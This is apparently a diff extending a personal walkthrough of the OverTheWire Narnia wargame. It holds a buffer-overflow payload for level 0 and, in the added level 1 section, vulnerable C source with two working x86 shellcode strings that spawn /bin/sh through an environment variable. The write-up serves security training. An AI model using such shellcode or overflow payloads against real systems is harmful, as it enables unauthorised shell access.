@@ -1,6 +1,6 @@
 These are my solutions to the narnia series of challenges from overthewire
 
-Level 0 -
+Level 0 - 1
 The goal of the first narnia challenge is a buffer overflow. Like all other challenges you are asked to ssh into the
 challenge. Once inside if you run ./narnia0 you will find that you need to change a variable. This is similar to the
 challenges at exploit exercises. The source code is this
@@ -38,3 +38,38 @@ or
 AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
 
 The reason cat is used is to keep open the shell as without it the shell will close.
+
+
+
+Level 1 - 2
+This is the second challenge in the Narnia series and after ssh' ing into the challenge the is a file , the source
+code fo the file which is gotten by running cat against the file is below -
+
+#include <stdio.h>
+ 
+int main(){
+int (*ret)();
+ 
+if(getenv("EGG")==NULL){
+printf("Give me something to execute at the env-variable EGG\n");
+exit(1);
+}
+ 
+printf("Trying to execute EGG!\n");
+ret = getenv("EGG");
+ret();
+ 
+return 0;
+}
+
+As you can see it is a c file, it is asking for an environmental variable called egg inside the getenv() function.
+Again this will require that we force material in order to redirect flow. There are as always a couple of ways
+that will do the same thing -
+This is working shellcode that will succeed in the challenge
+export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'  
+or using python as I have on other challenges
+export EGG=$(python -c'print 
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+There is also a fairly similar perl solution available but I am not that familiar with perl. There is also
+a great tutorial on shellcode at
+https://evilzone.org/tutorials/writing-shellcode-for-32-bit-linux-from-the-ground-up/
